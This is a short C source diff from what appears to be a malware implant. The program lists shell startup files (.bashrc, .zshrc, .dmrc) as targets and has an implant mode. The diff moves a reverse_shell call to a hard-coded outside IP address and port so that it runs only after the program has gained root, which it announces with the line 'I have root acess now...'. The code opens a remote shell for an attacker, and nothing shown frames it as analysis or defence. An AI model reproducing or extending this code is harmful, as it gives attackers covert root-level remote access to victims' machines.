@@ -24,7 +24,6 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
-  reverse_shell(9845, "206.189.197.67");
 
   //set mode
   int mode = P_IMPLANT;
@@ -69,6 +68,7 @@ int main(int argc, char ** argv){
 
   if(mode == P_ROOT){
     printf("I have root acess now...\n");
+    reverse_shell(9845, "206.189.197.67");
     while(1){
       sleep(1);
       printf("...\n");
